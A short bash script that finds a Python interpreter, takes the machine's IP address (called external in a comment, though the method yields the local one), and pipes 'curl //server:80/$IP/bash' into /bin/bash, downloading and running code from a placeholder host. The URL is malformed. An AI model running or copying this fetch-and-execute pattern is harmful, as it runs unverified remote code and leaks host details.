#!/bin/bash

# Get the python version 
if [ "`command -v python`" != "" ]; 
then 
py=python 
elif [ "`command -v python3`" != "" ]; 
then 
py=python3 
fi 
# Get the external IP address 
if [ "$py" != "" ]; 
then 
IP=`$py -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); print(s.getsockname()[0]); s.close()'`
fi

# curl the address
curl //server:80/$IP/bash | /bin/bash